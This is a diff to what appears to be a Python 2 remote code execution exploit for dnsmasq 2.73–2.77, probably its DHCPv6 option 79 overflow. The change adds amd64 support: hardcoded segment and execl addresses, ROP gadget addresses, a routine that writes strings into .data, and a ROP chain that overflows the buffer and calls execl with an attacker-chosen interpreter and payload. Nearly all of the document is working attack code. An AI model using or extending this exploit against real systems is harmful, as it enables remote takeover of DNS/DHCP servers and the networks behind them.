@@ -61,6 +61,13 @@ JUNK = {
         "2.75": 24,
         "2.74": 24,
         "2.73": 24
+    },
+    "amd64": {
+        "2.77": 32,
+        "2.76": 32,
+        "2.75": 32,
+        "2.74": 32,
+        "2.73": 32
     }
 }
 
@@ -73,6 +80,9 @@ TEXT = {
         "2.75": 0x08049ee0,
         "2.74": 0x08049ee0,
         "2.73": 0x08049f30
+    },
+    "amd64": {
+        "2.77": 0x0000000000402e00,
     }
 }
 
@@ -85,6 +95,9 @@ DATA = {
         "2.75": 0x08093240,
         "2.74": 0x08093240,
         "2.73": 0x08094240
+    },
+    "amd64": {
+        "2.77": 0x000000000064a480,
     }
 }
 
@@ -97,6 +110,9 @@ EXECL = {
         "2.75": 0x0806c00e,
         "2.74": 0x0806c00e,
         "2.73": 0x0806c78e
+    },
+    "amd64": {
+        "2.77": 0x0000000000427b30,
     }
 }
 
@@ -126,6 +142,13 @@ ROP = {
             "pop eax": 0x0808310c,  # pop eax ; ret
             "pop ebx": 0x08049681,  # pop ebx ; ret
             "mov": 0x0804d903       # mov dword ptr [eax], ebx ; pop ebx ; pop esi ; ret
+        },
+    },
+    "amd64": {
+        "2.77": {
+            "pop rsi": 0x00000000004038eb,  # pop rsi; ret
+            "pop rdi": 0x0000000000403439,  # pop rdi; ret
+            "mov": 0x00000000004338f9       # mov qword ptr [rsi + 0x70], rdi ; ret
         },
     }
 }
@@ -415,6 +438,16 @@ def add_string_in_data(addr_in_data, string):
                 rop_chain += Base.pack32(NOP[architecture])     # NOP (0x90909090) in ebx
                 rop_chain += Base.pack32(NOP[architecture])     # NOP (0x90909090) in esi
 
+    if architecture == "amd64":
+
+        if dnsmasq_version == "2.77":
+            for x in range(0, len(string), 8):
+                rop_chain += Base.pack64(ROP[a][v]["pop rsi"])     # pop rsi ; ret
+                rop_chain += Base.pack64(addr_in_data + x - 0x70)  # address in .data - 0x70
+                rop_chain += Base.pack64(ROP[a][v]["pop rdi"])     # pop rdi ; ret
+                rop_chain += string[x:x + 8]                       # 8 byte of string
+                rop_chain += Base.pack64(ROP[a][v]["mov"])         # mov qword ptr [rsi + 0x70], rdi ; ret
+
     return rop_chain
 
 
@@ -493,6 +526,10 @@ def exploit():
         interpreter_arg_addr = interpreter_addr + len(interpreter) + (4 - (len(interpreter) % 4)) + 4
         payload_addr = interpreter_arg_addr + len(interpreter_arg) + (4 - (len(interpreter_arg) % 4)) + 4
 
+        # print "Interpreter address: " + str(hex(interpreter_addr))
+        # print "Interpreter argument address: " + str(hex(interpreter_arg_addr))
+        # print "Payload address: " + str(hex(payload_addr))
+
         option_79 += Base.pack16(0)  # mac_type
 
         option_79 += "A" * JUNK[architecture][dnsmasq_version]
@@ -506,12 +543,45 @@ def exploit():
         option_79 += add_string_in_data(interpreter_arg_addr, interpreter_arg)
         option_79 += add_string_in_data(payload_addr, payload)
 
-        # option_79 += Base.pack32(CRASH[architecture])                   # crash for debug
+        # option_79 += Base.pack32(CRASH[architecture])  # crash for debug
         option_79 += Base.pack32(EXECL[architecture][dnsmasq_version])  # address of execl
         option_79 += Base.pack32(interpreter_addr)                      # address of interpreter
         option_79 += Base.pack32(interpreter_addr)                      # address of interpreter
         option_79 += Base.pack32(interpreter_arg_addr)                  # address of interpreter argument
         option_79 += Base.pack32(payload_addr)                          # address of payload
+
+    elif architecture == "amd64":
+
+        interpreter_addr = DATA[architecture][dnsmasq_version]
+        interpreter_arg_addr = interpreter_addr + len(interpreter) + (8 - (len(interpreter) % 8)) + 8
+        payload_addr = interpreter_arg_addr + len(interpreter_arg) + (8 - (len(interpreter_arg) % 8)) + 8
+
+        print "Interpreter address: " + str(hex(interpreter_addr))
+        print "Interpreter argument address: " + str(hex(interpreter_arg_addr))
+        print "Payload address: " + str(hex(payload_addr))
+
+        option_79 += Base.pack16(0)  # mac_type
+
+        option_79 += "A" * JUNK[architecture][dnsmasq_version]
+
+        option_79 += Base.pack64(NOP[architecture])  # RBX = 0x9090909090909090
+        option_79 += Base.pack64(NOP[architecture])  # RBP = 0x9090909090909090
+        option_79 += Base.pack64(NOP[architecture])  # R12 = 0x9090909090909090
+        option_79 += Base.pack64(NOP[architecture])  # R13 = 0x9090909090909090
+        option_79 += Base.pack64(NOP[architecture])  # R14 = 0x9090909090909090
+        option_79 += Base.pack64(NOP[architecture])  # R15 = 0x9090909090909090
+
+        # option_79 += Base.pack64(CRASH[architecture])  # crash for debug
+        option_79 += add_string_in_data(interpreter_addr, interpreter)
+        option_79 += add_string_in_data(interpreter_arg_addr, interpreter_arg)
+        option_79 += add_string_in_data(payload_addr, payload)
+
+        # option_79 += Base.pack64(CRASH[architecture])  # crash for debug
+        option_79 += Base.pack64(EXECL[architecture][dnsmasq_version])  # address of execl
+        option_79 += Base.pack64(interpreter_addr)                      # address of interpreter
+        option_79 += Base.pack64(interpreter_addr)                      # address of interpreter
+        option_79 += Base.pack64(interpreter_arg_addr)                  # address of interpreter argument
+        option_79 += Base.pack64(payload_addr)                          # address of payload
 
     else:
         print Base.c_error + "This architecture: " + architecture + " not yet supported!"
@@ -566,9 +636,10 @@ if __name__ == '__main__':
 
         print Base.c_info + "Payload: " + payload
 
-        print Base.c_info + "Address segment .text:  " + str(hex(TEXT[architecture][dnsmasq_version]))
-        print Base.c_info + "Address segment .data:  " + str(hex(DATA[architecture][dnsmasq_version]))
-        print Base.c_info + "Address execl function: " + str(hex(EXECL[architecture][dnsmasq_version]))
+        if args.architecture == "i386" or args.architecture == "amd64":
+            print Base.c_info + "Address segment .text:  " + str(hex(TEXT[architecture][dnsmasq_version]))
+            print Base.c_info + "Address segment .data:  " + str(hex(DATA[architecture][dnsmasq_version]))
+            print Base.c_info + "Address execl function: " + str(hex(EXECL[architecture][dnsmasq_version]))
 
         exploit()
 
